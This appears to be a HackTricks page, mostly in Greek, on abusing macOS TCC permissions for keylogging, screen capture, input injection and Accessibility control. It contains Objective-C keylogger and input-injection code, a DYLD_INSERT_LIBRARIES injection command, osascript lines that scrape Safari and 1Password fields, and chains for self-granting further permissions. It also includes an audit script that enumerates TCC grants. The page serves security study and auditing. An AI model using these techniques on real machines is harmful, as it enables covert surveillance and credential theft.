# macOS Input Monitoring, Screen Capture & Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τρεις σχετικές υπηρεσίες TCC ελέγχουν τον τρόπο με τον οποίο οι εφαρμογές μπορούν να παρατηρούν και να αλληλεπιδρούν με τη συνεδρία desktop του χρήστη:

| Υπηρεσία TCC | Permission | Δυνατότητα |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Ανάγνωση όλων των keyboard και mouse events σε ολόκληρο το σύστημα (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Εισαγωγή συνθετικών keyboard και mouse events |
| `kTCCServiceScreenCapture` | **Screen Capture** | Ανάγνωση του display buffer, λήψη screenshots, καταγραφή οθόνης |
| `kTCCServiceAccessibility` | **Accessibility** | Έλεγχος άλλων εφαρμογών μέσω του AXUIElement API, ανάγνωση UI elements |

Αυτά τα permissions αποτελούν **τον πιο επικίνδυνο συνδυασμό στο macOS** — μαζί παρέχουν:
- Πλήρες keylogging κάθε πλήκτρου που πατιέται (κωδικοί πρόσβασης, μηνύματα, πιστωτικές κάρτες)
- Καταγραφή οθόνης όλου του ορατού περιεχομένου
- Εισαγωγή συνθετικού input (click σε buttons, έγκριση dialogs)
- Πλήρη GUI control, ισοδύναμο με φυσική πρόσβαση

---

## Input Monitoring (kTCCServiceListenEvent)

### Πώς λειτουργεί

Το macOS χρησιμοποιεί το **`CGEventTap` API** για να επιτρέπει σε processes να intercept input events από το Quartz event system. Ένα process με ListenEvent permission μπορεί να δημιουργήσει ένα event tap που λαμβάνει **κάθε keyboard και mouse event** πριν ή αφού φτάσει στην εφαρμογή-στόχο.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Εντοπισμός Binaries με Entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Keylogging μέσω Code Injection

Εάν ένα binary με permission ListenEvent έχει επίσης **απενεργοποιημένο library validation** ή **επιτρέπει μεταβλητές περιβάλλοντος DYLD**, ένας attacker μπορεί να injectάρει ένα dylib που κάνει register ένα CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Το injected dylib κληρονομεί το ListenEvent TCC grant του target και καταγράφει όλα τα keystrokes.

### Attack: Credential Harvesting

Ένα εξελιγμένο keylogger μπορεί να συσχετίσει τα keystrokes με την ενεργή εφαρμογή:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Εγχυση Εισοδου (kTCCServicePostEvent)

### Πως Λειτουργει

Το permission PostEvent επιτρεπει τη δημιουργια ενος event tap με **`kCGEventTapOptionDefault`** (μπορει να τροποποιει/εισαγει events) αντι για ListenOnly.<sup>[[1]](#references)</sup> Αυτο επιτρεπει:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Επίθεση: Automated TCC Prompt Approval

Με το PostEvent, ένας επιτιθέμενος μπορεί να **προσομοιώσει το πάτημα του «Allow»** σε διαλόγους δικαιωμάτων TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Λήψη Οθόνης (kTCCServiceScreenCapture)

### Πώς Λειτουργεί

Η άδεια λήψης οθόνης επιτρέπει την ανάγνωση του buffer οθόνης χρησιμοποιώντας:
- **`CGWindowListCreateImage`** — λήψη οποιουδήποτε παραθύρου ή ολόκληρης της οθόνης
- **`ScreenCaptureKit`** (macOS 12.3+) — σύγχρονο API για streaming περιεχομένου οθόνης<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — λήψη οθόνης με επιτάχυνση υλικού
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Εντοπισμός Clients Καταγραφής Οθόνης
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Μια injected διεργασία screen capture μπορεί να καταγράφει περιοδικά frames και να χρησιμοποιεί OCR για την εξαγωγή κωδικών πρόσβασης:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Ξεκινώντας από το **macOS Sonoma**, η καταγραφή οθόνης εμφανίζει μια **μόνιμη ένδειξη** στη γραμμή μενού. Σε παλαιότερες εκδόσεις, η εγγραφή οθόνης μπορούσε να είναι εντελώς αθόρυβη. Ωστόσο, μια σύντομη καταγραφή ενός μόνο καρέ μπορεί να μην γίνει αντιληπτή από τους χρήστες.

### Επίθεση: Καταγραφή συνεδρίας

Η συνεχής καταγραφή οθόνης παρέχει πλήρη αναπαραγωγή της συνεδρίας του χρήστη:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Προσβασιμότητα (kTCCServiceAccessibility)

### Πώς λειτουργεί

Η πρόσβαση στην προσβασιμότητα παρέχει έλεγχο σε άλλες εφαρμογές μέσω του **AXUIElement API**.<sup>[[2]](#references)</sup> Μια διεργασία με πρόσβαση στην προσβασιμότητα μπορεί να:

1. **Διαβάζει** οποιοδήποτε στοιχείο UI σε οποιαδήποτε εφαρμογή (πεδία κειμένου, ετικέτες, κουμπιά, μενού)
2. **Κάνει κλικ** σε κουμπιά και να αλληλεπιδρά με στοιχεία ελέγχου
3. **Πληκτρολογεί** κείμενο σε οποιοδήποτε πεδίο κειμένου
4. **Περιηγείται** σε μενού και διαλόγους
5. **Συλλέγει** εμφανιζόμενα δεδομένα από οποιαδήποτε εκτελούμενη εφαρμογή
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Επίθεση: Αυτοχορήγηση TCC Permissions

Η πιο επικίνδυνη κατάχρηση του Accessibility είναι η **πλοήγηση στις System Settings για τη χορήγηση πρόσθετων permissions στο δικό σας malware**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Επίθεση: Συλλογή δεδομένων μεταξύ εφαρμογών
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Επίθεση: Αυτοματοποιημένες ενέργειες χρήστη
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Αλυσίδες Επίθεσης

### Αλυσίδα: Παρακολούθηση Εισόδου + Καταγραφή Οθόνης = Πλήρης Παρακολούθηση
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Αλυσίδα: Accessibility + PostEvent = Πλήρης Απομακρυσμένος Έλεγχος
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Αλυσίδα: Accessibility → Αυτοχορήγηση πρόσβασης σε κάμερα/μικρόφωνο → Παρακολούθηση
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Ανίχνευση και Απαρίθμηση
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Αναφορές

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
